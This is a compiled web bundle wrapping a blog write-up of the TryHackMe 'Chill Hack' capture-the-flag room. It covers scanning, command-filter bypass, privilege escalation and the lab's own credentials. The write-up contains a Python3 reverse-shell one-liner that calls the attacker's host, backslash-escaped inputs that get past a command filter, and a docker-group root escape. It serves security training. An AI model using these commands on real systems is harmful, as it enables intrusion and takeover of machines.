"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[5280],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return h}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},d=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),u=p(n),h=r,m=u["".concat(l,".").concat(h)]||u[h]||c[h]||i;return n?a.createElement(m,o(o({ref:t},d),{},{components:n})):a.createElement(m,o({ref:t},d))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,o=new Array(i);o[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,o[1]=s;for(var p=2;p<i;p++)o[p]=n[p];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},67877:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},assets:function(){return d},toc:function(){return c},default:function(){return h}});var a=n(87462),r=n(63366),i=(n(67294),n(3905)),o=["components"],s={title:"THM chillhack writeup",description:"writeup of chillhack room from Tryhackme",authors:["shivam"],slug:"chillhack",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png",tags:["python3","zip2john","docker","mysql"]},l=void 0,p={permalink:"/Cybernotes/blog/chillhack",source:"@site/blog/2022-02-27-chillHack/chillHack.md",title:"THM chillhack writeup",description:"writeup of chillhack room from Tryhackme",date:"2022-02-27T00:00:00.000Z",formattedDate:"February 27, 2022",tags:[{label:"python3",permalink:"/Cybernotes/blog/tags/python-3"},{label:"zip2john",permalink:"/Cybernotes/blog/tags/zip-2-john"},{label:"docker",permalink:"/Cybernotes/blog/tags/docker"},{label:"mysql",permalink:"/Cybernotes/blog/tags/mysql"}],readingTime:4.6,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"THM chillhack writeup",description:"writeup of chillhack room from Tryhackme",authors:["shivam"],slug:"chillhack",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png",tags:["python3","zip2john","docker","mysql"]},prevItem:{title:"THM Brute-it writeup",permalink:"/Cybernotes/blog/bruteit"},nextItem:{title:"Vulnhub SAR-1 writeup",permalink:"/Cybernotes/blog/sar-1"}},d={authorsImageUrls:[void 0]},c=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Gobuster results",id:"gobuster-results",children:[],level:2},{value:"FTP",id:"ftp",children:[],level:2},{value:"Enumeration",id:"enumeration",children:[],level:2},{value:"User privesc",id:"user-privesc",children:[],level:2},{value:"Anurodh",id:"anurodh",children:[],level:2},{value:"Root",id:"root",children:[],level:2}],u={toc:c};function h(e){var t=e.components,s=(0,r.Z)(e,o);return(0,i.kt)("wrapper",(0,a.Z)({},u,s,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Hello everyone,"),(0,i.kt)("p",null,"Today we are going to solve chillhack from tryhackme. we will learn about python3 reverse shell, ssh port forwarding,zip2john and docker group privilege escalation."),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png",alt:null})),(0,i.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},"Nmap scan report for 10.10.9.151 (10.10.9.151)\nHost is up (0.19s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.9.2.206\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)\n|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)\n|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Game Info\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.63 seconds\n")),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"gobuster-results"},"Gobuster results"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c"},"===============================================================\n/.htaccess            (Status: 403) [Size: 276]\n/.htpasswd            (Status: 403) [Size: 276]\n/css                  (Status: 301) [Size: 308] [--\x3e http://10.10.9.151/css/]\n/fonts                (Status: 301) [Size: 310] [--\x3e http://10.10.9.151/fonts/]\n/images               (Status: 301) [Size: 311] [--\x3e http://10.10.9.151/images/]\n/js                   (Status: 301) [Size: 307] [--\x3e http://10.10.9.151/js/]\n/secret               (Status: 301) [Size: 311] [--\x3e http://10.10.9.151/secret/]\n/server-status        (Status: 403) [Size: 276]\n===============================================================\n")),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"ftp"},"FTP"),(0,i.kt)("p",null,"--\x3e Got the file named ",(0,i.kt)("inlineCode",{parentName:"p"},"notes.txt")," in ftp"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"Anurodh told me that there is some filtering on strings being put in the command -- Apaar\n")),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"enumeration"},"Enumeration"),(0,i.kt)("p",null,"--\x3e I got this website on port 80"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(15269).Z,width:"1787",height:"711"})),(0,i.kt)("p",null,"--\x3e After going to the ",(0,i.kt)("inlineCode",{parentName:"p"},"secret")," directory i found one input and it was asking for command to execute. so i tried to do ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," and i got the results"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(36155).Z,width:"1597",height:"583"})),(0,i.kt)("p",null,"--\x3e But it was filtering many commands so after some time i tried to do like ",(0,i.kt)("inlineCode",{parentName:"p"},"l\\s")," and it got executed !"),(0,i.kt)("p",null,"and i found 2 files/directories in current directory."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"images index.php\n")),(0,i.kt)("p",null,"--\x3e Now let's read the content of ",(0,i.kt)("inlineCode",{parentName:"p"},"index.php")),(0,i.kt)("p",null,"And i found it using command ",(0,i.kt)("inlineCode",{parentName:"p"},"c\\at index.php")),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(24034).Z,width:"1603",height:"561"})),(0,i.kt)("p",null,"--\x3e I tried with ",(0,i.kt)("inlineCode",{parentName:"p"},"bash")," ",(0,i.kt)("inlineCode",{parentName:"p"},"php")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"python")," shells but it didn't worked then at last i tried ",(0,i.kt)("inlineCode",{parentName:"p"},"python3")," shell with python3 as ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/bin/python3")," and it worked and i got the reverse shell !"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(9298).Z,width:"1213",height:"513"})),(0,i.kt)("p",null,"==> Python shell :"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'export RHOST="10.9.2.206";export RPORT=4444;/usr/bin/python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'\n')),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"user-privesc"},"User privesc"),(0,i.kt)("p",null,"--\x3e When i done ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo -l")," i found that i can run ",(0,i.kt)("inlineCode",{parentName:"p"},"helpline.sh")," file as a user ",(0,i.kt)("inlineCode",{parentName:"p"},"apaar")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh")),(0,i.kt)("p",null,"--\x3e So let's run it with the command : ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo -u apaar /home/apaar/.helpline.sh")," and enter ",(0,i.kt)("inlineCode",{parentName:"p"},"/bin/bash")," in every field and i got the shell of ",(0,i.kt)("inlineCode",{parentName:"p"},"apaar")," user."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(10719).Z,width:"1127",height:"313"})),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"anurodh"},"Anurodh"),(0,i.kt)("p",null,"--\x3e After some searching i found that there are 3 internal ports are running ",(0,i.kt)("inlineCode",{parentName:"p"},"9001")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"3306")," so i done curl on both ports and found one customer portal on port ",(0,i.kt)("inlineCode",{parentName:"p"},"9001")," but i don't know username and password to login."),(0,i.kt)("p",null,"--\x3e Then i found the mysql password for ",(0,i.kt)("inlineCode",{parentName:"p"},"root")," in ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/www/files/index.php")),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(82768).Z,width:"1701",height:"903"})),(0,i.kt)("p",null,"--\x3e Then i logged in using this creds : ",(0,i.kt)("inlineCode",{parentName:"p"},"root:!@m+her00+@db")),(0,i.kt)("p",null,"And after that i got the password for user ",(0,i.kt)("inlineCode",{parentName:"p"},"anurodh")," in ",(0,i.kt)("inlineCode",{parentName:"p"},"webportal")," db."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(49845).Z,width:"1181",height:"253"})),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"+----+-----------+----------+-----------+----------------------------------+\n| id | firstname | lastname | username  | password                         |\n+----+-----------+----------+-----------+----------------------------------+\n|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |\n|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |\n+----+-----------+----------+-----------+----------------------------------+\n")),(0,i.kt)("p",null,"After cracking :"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"anurodh:masterpassword")),(0,i.kt)("p",null,"--\x3e Now let's try to login using ssh."),(0,i.kt)("p",null,"But it didn't worked so let's try to login on port ",(0,i.kt)("inlineCode",{parentName:"p"},"9001")," using this creds."),(0,i.kt)("p",null,"--\x3e but then i generated new ssh keys and entered the public keys in ",(0,i.kt)("inlineCode",{parentName:"p"},"autorized_keys")," file and also i forwarded the port ",(0,i.kt)("inlineCode",{parentName:"p"},"9001")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"ssh apaar@10.10.208.94 -i key -L 9001:localhost:9001\n")),(0,i.kt)("p",null,"--\x3e After that i went to the port ",(0,i.kt)("inlineCode",{parentName:"p"},"9001")," and found one login page."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(74956).Z,width:"1361",height:"843"})),(0,i.kt)("p",null,"--\x3e We have the creds which we found in the database so let's login"),(0,i.kt)("p",null,"after login i found this page :"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(62080).Z,width:"1565",height:"867"})),(0,i.kt)("p",null,"--\x3e So it says ",(0,i.kt)("inlineCode",{parentName:"p"},"Look in the dark you will find your answer")," but i can't find any dark thing here xD."),(0,i.kt)("p",null,"so there must be anything with the image so Let's download the image and do some stegno."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"steghide info hacker.jpeg\n")),(0,i.kt)("p",null,"I found one file called ",(0,i.kt)("inlineCode",{parentName:"p"},"backup.zip")," in the image"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(32219).Z,width:"699",height:"389"})),(0,i.kt)("p",null,"let's extract it"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"steghide extract -sf hacker.jpeg\n")),(0,i.kt)("p",null,"--\x3e But the file is asking for a passphrase so we have to find the passphrase for the zip file using ",(0,i.kt)("inlineCode",{parentName:"p"},"zip2john")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"zip2john backup.zip > converted\njohn --wordlist=/usr/share/wordlists/rockyou.txt converted\n")),(0,i.kt)("p",null,"--\x3e And i found the passphrase ",(0,i.kt)("inlineCode",{parentName:"p"},"pass1word")),(0,i.kt)("p",null,"After unzipping the file i got one file called ",(0,i.kt)("inlineCode",{parentName:"p"},"source_code.php")," Let's read this file."),(0,i.kt)("p",null,"and i got one base64 encoded password in the file"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(85450).Z,width:"1501",height:"891"})),(0,i.kt)("p",null,"--\x3e And this password looks of ",(0,i.kt)("inlineCode",{parentName:"p"},"Anurodh")," because of this code"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(88712).Z,width:"1143",height:"703"})),(0,i.kt)("p",null,"After decoding the password i got this"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"anurodh:!d0ntKn0wmYp@ssw0rd")),(0,i.kt)("p",null,"--\x3e Let's login on ssh !"),(0,i.kt)("p",null,"and we got ssh shell !"),(0,i.kt)("hr",null),(0,i.kt)("h2",{id:"root"},"Root"),(0,i.kt)("p",null,"--\x3e When i done ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," then i found that ",(0,i.kt)("inlineCode",{parentName:"p"},"docker")," is a part of our group so i searched for ",(0,i.kt)("inlineCode",{parentName:"p"},"docker group privilege escalation")," and i found this command on ",(0,i.kt)("inlineCode",{parentName:"p"},"gtfobins")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n")),(0,i.kt)("p",null,"--\x3e and we got root shell !"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(84595).Z,width:"1565",height:"785"})))}h.isMDXComponent=!0},36155:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103080408-b07f4635886eb85c3cfedb69c62aa945.png"},15269:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103080502-716dcb403cfe577654c6e9fe2bd7c018.png"},24034:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103085318-4dd986ca5d41afc014828cd2d173fbd2.png"},9298:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103090732-ebe50ce2b444d53604166fc7d9563661.png"},10719:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103112428-785cc4ed25c32a2c46477a2f67d22e8e.png"},82768:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103114825-c9262e1c209c9eeb4d622b145144f35b.png"},49845:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103114944-f664f77045ad7d6efe5b7ad36b29739e.png"},74956:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103132815-64a264c1ccce838b2b28ceef5b1ed298.png"},62080:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103132915-6892df840086372d2f30137963bb4815.png"},32219:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103133301-a4fd163572827e8fb237c90724d27bf4.png"},85450:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103133603-b4e8813dfad896fdb4c1a338696d30ae.png"},88712:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103133654-95cb7a0a89cce0dff1b23d9ce1788aaf.png"},84595:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211103133902-dce14e6f38454a5f4b2b5d0bf07800d8.png"}}]);